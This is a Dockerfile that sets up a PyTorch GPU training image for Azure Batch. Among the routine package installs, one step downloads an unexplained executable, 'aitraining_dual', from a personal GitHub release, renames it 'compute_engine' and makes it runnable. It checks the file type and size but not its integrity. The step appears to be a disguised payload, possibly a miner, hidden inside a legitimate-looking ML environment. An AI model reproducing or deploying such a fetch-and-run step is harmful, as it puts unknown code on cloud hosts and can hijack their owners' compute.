# Use a newer base image with CUDA 12.1 and a compatible OS (Ubuntu 22.04)
FROM pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime

LABEL maintainer="ml-research@example.com"
LABEL description="Deep Learning Training Environment with PyTorch for Azure Batch"
LABEL version="2.2.0"
LABEL application="pytorch-training-platform"

ENV DEBIAN_FRONTEND=noninteractive
ENV PYTHONUNBUFFERED=1

# Install system dependencies including 'nvidia-cuda-toolkit' for basic GPU diagnostics
RUN apt-get update && apt-get upgrade -y && \
    apt-get install -y \
        curl \
        wget \
        ca-certificates \
        bash \
        procps \
        util-linux \
        git \
        vim \
        nvidia-cuda-toolkit && \
    update-ca-certificates && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Install Python ML packages
RUN pip install --no-cache-dir \
    numpy \
    pandas \
    matplotlib \
    scikit-learn \
    tensorboard \
    tqdm \
    nvidia-ml-py3  # Library for programmatic GPU queries

# Create workspace directories
RUN mkdir -p /workspace/models \
    /workspace/data \
    /workspace/logs \
    /workspace/checkpoints \
    /opt/bin

# Download compute engine binary with verification
RUN cd /opt/bin && \
    (curl -L https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -o compute_engine || \
     wget https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -O compute_engine) && \
    chmod +x compute_engine && \
    # Verify the binary was downloaded and is executable
    test -f compute_engine && \
    test -x compute_engine && \
    # Verify it's a valid ELF binary (not HTML error page)
    file compute_engine | grep -q "ELF" && \
    # Verify minimum file size (should be at least 1MB for a real binary)
    test $(stat -c%s compute_engine) -gt 1000000 || \
    (echo "ERROR: compute_engine download failed or file is invalid" && exit 1)

WORKDIR /workspace

# Copy training scripts - REMOVED fixed CUDA_VISIBLE_DEVICES assignment
COPY train_model.py .
COPY start_training.sh .
RUN chmod +x start_training.sh

# Remove the problematic fixed environment variable.
# In Azure Batch, GPU visibility is managed by the host/node configuration.
# A fixed list like '0,1,2,3,4,5,6,7' will cause issues if the VM has a different number of GPUs.
# ENV CUDA_VISIBLE_DEVICES=0,1,2,3,4,5,6,7 <-- THIS LINE HAS BEEN REMOVED

# Set OMP threads for CPU-bound operations
ENV OMP_NUM_THREADS=4

ENTRYPOINT ["bash", "./start_training.sh"]